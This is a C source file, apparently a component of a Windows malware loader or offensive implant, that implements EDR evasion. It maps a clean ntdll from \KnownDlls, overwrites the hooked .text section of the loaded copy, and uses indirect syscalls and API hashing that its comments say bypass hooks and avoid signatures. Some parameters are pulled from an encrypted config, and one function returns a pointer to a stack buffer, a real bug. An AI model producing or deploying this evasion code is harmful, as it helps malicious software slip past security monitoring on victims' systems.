#include <Windows.h>
#include <winternl.h>

#include "HellsHall.h"
#include "ResolveFunctionsDynamically.hpp"

#include "StringManipulation.hpp"
#include "MemoryManipulation.hpp"

#include "Unhooking.h"

#define DEBUG 0

#if DEBUG
#include <stdio.h>

#define PRINTA2( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

#endif //DEBUG


#define InitializeObjectAttributes2(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}


//duplicate of the function we wrote for api hashing.
//difference is it takes as arguments the key & SEED argument.
DWORD CFuncHashStringDjb2W(const wchar_t* String, UINT g_KEY, UINT SEEDLING) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEEDLING) + Hash) + c;
	}

	return Hash;
}

//function is used for creating a mapping of our target DLL.
BOOL MapDllFromKnownDlls(IN PWSTR DllName, IN PNTAPI_FUNC_TABLE SysCallTable, OUT PVOID* ppDllBuffer)
{
	//setup variables necessary for func.
	HANDLE hSection = NULL;
	PBYTE pDllBuffer = NULL;
	NTSTATUS STATUS = NULL;
	UNICODE_STRING uStr;
	OBJECT_ATTRIBUTES ObjAtrs;

	ZeroMemoryEx(&uStr, sizeof(UNICODE_STRING));
	ZeroMemoryEx(&ObjAtrs, sizeof(OBJECT_ATTRIBUTES));

	//create a unicode string structure containing \\KnownDlls\\DllName.
	uStr.Buffer = (PWSTR)DllName;
	uStr.Length = (StringLengthW(DllName) * sizeof(WCHAR));
	uStr.MaximumLength = uStr.Length + sizeof(WCHAR);

	//initialize our attributes with our unicode string.
	InitializeObjectAttributes2(&ObjAtrs, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//use indirect syscalls to open a section.
	SET_SYSCALL(SysCallTable->NtOpenSection);
	if ((STATUS = RunSyscall(&hSection, SECTION_MAP_READ, &ObjAtrs)) != 0x00)
		return FALSE;

	//use indirect syscalls to map the section.
	SIZE_T dwSize = 0;
	SET_SYSCALL(SysCallTable->NtMapViewOfSection);
	STATUS = RunSyscall(hSection, NtCurrentProcess(), &pDllBuffer, NULL, NULL, NULL, &dwSize, 2, NULL, PAGE_READONLY);
	if(STATUS != 0x00 && STATUS != STATUS_IMAGE_NOT_AT_BASE)
		return FALSE;

	//successfully return the buffer.
	*ppDllBuffer = pDllBuffer;

	//cleanup
	if (hSection)
		CloseHandle(hSection);
	if (*ppDllBuffer == NULL)
		return FALSE;

	//success.6
	return TRUE;
}

//function takes in a module name hash, a syscall table, and unhooked dll section mapping.
BOOL ReplaceDllTextSection(IN DWORD dwModuleName, IN PNTAPI_FUNC_TABLE SysCallTable, IN PVOID pUnhookedDll, IN unsigned char* DecryptedConfig)
{
	//gets the handle of the hooked DLL by calling our ManualGetModuleHandle function & using our module name's hash.
	PVOID pLocalDLL = (PVOID)ManualGetModuleHandle(dwModuleName, SysCallTable->g_Key);

	//obtian pointers to relevant PE headers.
	PIMAGE_DOS_HEADER pLocalDllDosHdr = (PIMAGE_DOS_HEADER)pLocalDLL;
	if (!pLocalDllDosHdr)
		return FALSE;

	if (pLocalDllDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;
	
	PIMAGE_NT_HEADERS pLocalDllNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalDLL + pLocalDllDosHdr->e_lfanew);
	if (pLocalDllNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;
	
	//setup vars for subsequent usage.
	PVOID pLocalDllTxt = NULL;
	PVOID pRemoteDllTxt = NULL;
	SIZE_T dwDllTxtSize = NULL;
	
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalDllNtHdrs);
	

	CHAR text[6];
	ZeroMemoryEx(text, sizeof(CHAR) * 6);

	CopyMemoryEx(text, (StringLocateCharA((PCHAR)DecryptedConfig, '|', 9) - 6), 6);
	StringTerminateStringAtCharA(text, '|');
	//loop through our sections and find the one named ".text"
	for (int i = 0; i < pLocalDllNtHdrs->FileHeader.NumberOfSections; i++)
	{
		//use VX-API function to find our section.
		if (StringCompareA(pSectionHeader[i].Name, text) == 0)
		{
			//calculate the .text section offsets.
			pLocalDllTxt = (PVOID)((ULONG_PTR)pLocalDLL + pSectionHeader[i].VirtualAddress);
			pRemoteDllTxt = (PVOID)((ULONG_PTR)pUnhookedDll + pSectionHeader[i].VirtualAddress);
			dwDllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	//make sure everything went well.
	if (!pLocalDllTxt || !pRemoteDllTxt || !dwDllTxtSize)
		return FALSE;

	//double check.
	if (*(ULONGLONG*)pLocalDllTxt != *(ULONGLONG*)pRemoteDllTxt)
		return FALSE;

	DWORD dwOldProtection = NULL;
	NTSTATUS STATUS = NULL;
	
	//use indirect system calls to spoof call stack location & bypass currently installed hooks. to overwrite memory.
	SET_SYSCALL(SysCallTable->NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(NtCurrentProcess(), &pLocalDllTxt, &dwDllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) != 0x00)
		return FALSE;

	CopyMemoryEx(pLocalDllTxt, pRemoteDllTxt, dwDllTxtSize);

	if ((STATUS = RunSyscall(NtCurrentProcess(), &pLocalDllTxt, &dwDllTxtSize, dwOldProtection, &dwOldProtection)) != 0x00)
		return FALSE;

	//success.
	return TRUE;
}


//a slight variation of ManualGetModuleHandle function that returns the name of the module when given the module hash name.
//This is useful for us because now we don't have to store the module handle name anywhere in the binary and potentially give ourselves a signature.
// We will instead look up the module dynamically. If the hash is ever signaturized we can create new hashes.
PWSTR GetModuleNameFromHash(IN DWORD dwModuleNameHash, IN PNTAPI_FUNC_TABLE FuncTable)
{

	//obtian pointer to the peb address.
#ifdef _WIN64 // if compiling as x64
	PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif


	//get loader data
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

	//Get the first element in the linked list
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	//cycle through module linked list.
	while (pDataTableEntry)
	{
		if (pDataTableEntry->FullDllName.Buffer[0] != NULL)
		{
			WCHAR TmpStr[MAX_PATH];
			toLowerW(TmpStr, pDataTableEntry->FullDllName.Buffer);
			StringTerminateStringAtCharW(TmpStr, '.');
			DWORD CurrModuleHash = CFuncHashStringDjb2W(TmpStr, FuncTable->g_Key, FuncTable->SEEDLING);

			//do we have a match?
			if (dwModuleNameHash == CurrModuleHash)
			{
				//return the module name as lower case string.
				WCHAR ReturnStr[MAX_PATH];
				toLowerW(ReturnStr, pDataTableEntry->FullDllName.Buffer);
				return ReturnStr;
			}
		}
		else
		{
			//no more entries.
			break;
		}
		//get the next entry;
		pDataTableEntry = *(PLDR_DATA_TABLE_ENTRY*)(pDataTableEntry);
	}
	//module was not found.
	return NULL;
}

BOOL UnhookDll(IN PNTAPI_FUNC_TABLE FuncTable, unsigned char* DecryptedConfig)
{
	//initialize needed variables.
	PVOID pDllBuffer = NULL;
	WCHAR NtdllModuleName[MAX_PATH];
	WCHAR KnownDllsPath[20];
	WCHAR KnownDllsPath2[20];

	ZeroMemoryEx(NtdllModuleName, MAX_PATH * sizeof(WCHAR));
	ZeroMemoryEx(KnownDllsPath, 20 * sizeof(WCHAR));
	ZeroMemoryEx(KnownDllsPath2, 20 * sizeof(WCHAR));

	CharStringToWCharString(KnownDllsPath, (StringLocateCharA((PCHAR)DecryptedConfig, '|', 2) - 12), 12);
	CopyMemoryEx(KnownDllsPath2, KnownDllsPath, 24);
	StringTerminateStringAtCharW(KnownDllsPath2, '|');
	StringCopyW(NtdllModuleName, KnownDllsPath2);

	NTSTATUS STATUS = NULL;

	//obtain the a string needed to obtain section mapping from knowndll path.
	StringConcatW(NtdllModuleName, GetModuleNameFromHash(FuncTable->dwNtDllHash, FuncTable));

	//obtain mapping of the ntdll module.
	if (!MapDllFromKnownDlls(NtdllModuleName, FuncTable, &pDllBuffer))
		return FALSE;

	//replace the hooked .text section with clean module .text section
	if (!ReplaceDllTextSection(FuncTable->dwNtDllHash, FuncTable, pDllBuffer, DecryptedConfig))
		return FALSE;

	//unmap our mapped section.
	SET_SYSCALL(FuncTable->NtUnmapViewOfSection);
	if((STATUS = RunSyscall(NtCurrentProcess(), pDllBuffer)) != 0x00)
		return FALSE;

	return TRUE;
}
